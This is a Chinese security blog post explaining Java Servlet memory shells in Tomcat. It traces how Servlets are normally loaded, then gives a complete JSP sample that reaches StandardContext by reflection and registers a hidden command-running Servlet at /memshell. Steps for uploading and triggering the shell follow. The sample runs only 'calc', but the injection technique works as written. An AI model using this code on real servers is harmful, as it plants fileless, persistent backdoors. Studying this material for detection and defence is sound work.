---
title: "Java 内存马（一）：Servlet 内存马"
date: "2025-03-24 20:17:48"
updated: "2026-05-30 19:26:35"
categories: ["文章", "代码审计"]
tags: ["内存马", "Servlet"]
thumbnail: ""
first_image_as_thumbnail: true
excerpt: ""
after_post: ""
comments: true
wp_id: "865"
---
<div class="md-hr md-end-block" tabindex="-1">
<h2 class="md-end-block md-heading"><span class="md-plain">1. 基本概念</span></h2>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Servlet 内存马</span></strong></span><span class="md-plain"> 是通过 </span><span class="md-pair-s "><strong><span class="md-plain">运行时动态注册 Servlet</span></strong></span><span class="md-plain"> 的方式，将恶意 Servlet 植入 Web 容器中。</span></p>
<p class="md-end-block md-p"><span class="md-plain">特点：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">无文件落地</span></strong></span><span class="md-plain">：不依赖磁盘上的 class 文件或 web.xml 配置</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">驻留内存</span></strong></span><span class="md-plain">：直至容器重启前一直存在</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">隐蔽性高</span></strong></span><span class="md-plain">：通过 URL 请求即可触发，常规查杀不易发现</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-plain">常见利用场景：攻击者上传一个 JSP 文件，通过反射操作 Tomcat 内部对象，在运行时注入恶意 Servlet。</span></p>

<h2 class="md-end-block md-heading"><span class="md-plain">2. Servlet 装载流程（开发者视角）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">要理解内存马，首先需要知道 </span><span class="md-pair-s "><strong><span class="md-plain">正常情况下 Servlet 是如何被加载的</span></strong></span><span class="md-plain">。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">2.1 编写 Servlet 类</span></h3>


```java
public class HelloServlet extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("hello world");
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.2 在 web.xml 中配置</span></h3>


```xml
<servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>com.example.memshell.HelloServlet</servlet-class>
</servlet>
​
<servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/hello</url-pattern>
</servlet-mapping>
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.3 Tomcat 加载</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启动时，Tomcat 解析 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">加载 </span><span class="md-pair-s" spellcheck="false"><code>HelloServlet</code></span><span class="md-plain"> 类</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">建立 URL </span><span class="md-pair-s" spellcheck="false"><code>/hello</code></span><span class="md-plain"> 与该 Servlet 的映射</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">3. Tomcat Servlet 加载流程（容器内部机制）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">深入 Tomcat 源码，可以看到 Servlet 装载的具体过程。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.1 Web 应用启动</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">每个 Web 应用对应一个 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain"> 容器</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Tomcat 调用 </span><span class="md-pair-s" spellcheck="false"><code>ContextConfig#configureStart()</code></span><span class="md-plain">，加载并解析 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.2 解析 web.xml</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>ContextConfig#configureContext(WebXml webxml)</code></span><span class="md-plain"> 方法处理配置</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">webxml 内部结构</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>webxml.servlets</code></span><span class="md-plain">：保存 </span><span class="md-pair-s" spellcheck="false"><code>&lt;servlet&gt;</code></span><span class="md-plain"> 定义</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>webxml.servletMappings</code></span><span class="md-plain">：保存 </span><span class="md-pair-s" spellcheck="false"><code>&lt;servlet-mapping&gt;</code></span><span class="md-plain"> 映射关系</span></p>
</li>
</ul>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.3 注册 Servlet 定义</span></h3>


```java
for (WebXml.Servlet servlet : webxml.getServlets().values()) {
    Wrapper wrapper = context.createWrapper();
    wrapper.setName(servlet.getName());
    wrapper.setServletClass(servlet.getClassName());
    context.addChild(wrapper);
}
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>createWrapper()</code></span><span class="md-plain"> → 创建 </span><span class="md-pair-s" spellcheck="false"><code>StandardWrapper</code></span><span class="md-plain">（Servlet 包装类）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addChild(wrapper)</code></span><span class="md-plain"> → 将 Servlet 注册到 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-plain">👉 此时，Servlet 已被加入容器，但尚未建立 URL 映射。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.4 注册 URL 映射</span></h3>


```java
for (Map.Entry<String, String> entry : webxml.getServletMappings().entrySet()) {
    context.addServletMappingDecoded(entry.getKey(), entry.getValue());
}
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>entry.getKey()</code></span><span class="md-plain"> → URL pattern，例如 </span><span class="md-pair-s" spellcheck="false"><code>/hello</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>entry.getValue()</code></span><span class="md-plain"> → Servlet 名称，例如 </span><span class="md-pair-s" spellcheck="false"><code>HelloServlet</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">存入 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext.servletMappings</code></span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.5 请求处理流程</span></h3>
<p class="md-end-block md-p"><span class="md-plain">当客户端请求 </span><span class="md-pair-s" spellcheck="false"><code>/hello</code></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>Mapper</code></span><span class="md-plain"> 组件根据 URL 找到对应的 </span><span class="md-pair-s" spellcheck="false"><code>Wrapper</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>Wrapper.allocate()</code></span><span class="md-plain"> 创建或复用 Servlet 实例</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">调用 </span><span class="md-pair-s" spellcheck="false"><code>service()</code></span><span class="md-plain"> 方法 → 分发到 </span><span class="md-pair-s" spellcheck="false"><code>doGet()</code></span><span class="md-plain">/</span><span class="md-pair-s" spellcheck="false"><code>doPost()</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">返回响应给客户端</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">3.6 关键类总结</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">StandardContext</span></strong></span><span class="md-plain">：Web 应用容器，管理所有 Servlet/Filter/Listener</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">StandardWrapper</span></strong></span><span class="md-plain">：Servlet 包装类，负责生命周期管理（init/service/destroy）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Mapper</span></strong></span><span class="md-plain">：负责 URL 匹配和请求分发</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">ContextConfig</span></strong></span><span class="md-plain">：负责解析 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span><span class="md-plain"> 并注册到容器</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.7 内存马切入点</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">正常流程：由 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span><span class="md-plain"> 驱动</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">内存马流程：</span><span class="md-pair-s "><strong><span class="md-plain">跳过配置文件</span></strong></span><span class="md-plain">，直接在运行时操作 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">核心调用：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addChild(wrapper)</code></span><span class="md-plain"> → 注入恶意 Servlet</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addServletMappingDecoded(url, name)</code></span><span class="md-plain"> → 建立恶意 URL 映射</span></p>
</li>
</ul>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">4. 内存马实现机制</span></h2>
<p class="md-end-block md-p"><span class="md-plain">内存马的实现步骤：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">创建恶意 Servlet 类</span></strong></span><span class="md-plain">（执行命令/回显等）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取 StandardContext</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过 </span><span class="md-pair-s" spellcheck="false"><code>request.getServletContext()</code></span><span class="md-plain"> → 反射逐层获取内部 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">创建 Wrapper 并封装 Servlet</span></strong></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">将 Wrapper 注册到容器</span></strong></span><span class="md-plain">（</span><span class="md-pair-s" spellcheck="false"><code>addChild(wrapper)</code></span><span class="md-plain">)</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">设置 URL 映射</span></strong></span><span class="md-plain">（</span><span class="md-pair-s" spellcheck="false"><code>addServletMappingDecoded()</code></span><span class="md-plain">）</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">5. 示例代码（JSP 内存马）</span></h2>


```
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    // 恶意 Servlet 定义
    public class ShellServlet extends HttpServlet {
        @Override
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            Runtime.getRuntime().exec("calc"); // 示例：执行系统命令
        }
    }
%>

<%
    // 1. 获取 ServletContext
    ServletContext servletContext = request.getServletContext();

    // 2. 反射获取 ApplicationContext
    Field appCtxField = servletContext.getClass().getDeclaredField("context");
    appCtxField.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext) appCtxField.get(servletContext);

    // 3. 获取 StandardContext
    Field stdCtxField = appCtx.getClass().getDeclaredField("context");
    stdCtxField.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdCtxField.get(appCtx);

    // 4. 创建 Wrapper
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("memshell");
    wrapper.setServletClass(ShellServlet.class.getName());
    wrapper.setServlet(new ShellServlet());

    // 5. 注册 Servlet 与映射
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/memshell", "memshell");
%>
```


<h2 class="md-end-block md-heading"><span class="md-plain">6. 触发步骤</span></h2>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">上传 JSP 木马到目标服务器</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问 JSP → 执行注入逻辑</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问 </span><span class="md-pair-s" spellcheck="false"><code>/memshell</code></span><span class="md-plain"> → 触发恶意 Servlet</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">（可选）删除 JSP 文件，内存马依然存活</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading md-focus"><span class="md-plain">7. 总结</span></h2>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">开发者视角</span></strong></span><span class="md-plain">：编写 Servlet → 配置 web.xml → Tomcat 自动加载</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">容器内部视角</span></strong></span><span class="md-plain">：ContextConfig 解析 web.xml → 创建 Wrapper → 注册到 StandardContext → 建立 URL 映射</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内存马本质</span></strong></span><span class="md-plain">：在运行时动态完成这一套流程，不依赖文件，直接在内存中注册恶意 Servlet</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">关键 API</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>addChild()</code></span><span class="md-plain">、</span><span class="md-pair-s md-expand" spellcheck="false"><code>addServletMappingDecoded()</code></span></p>
</li>
</ul>
</div>
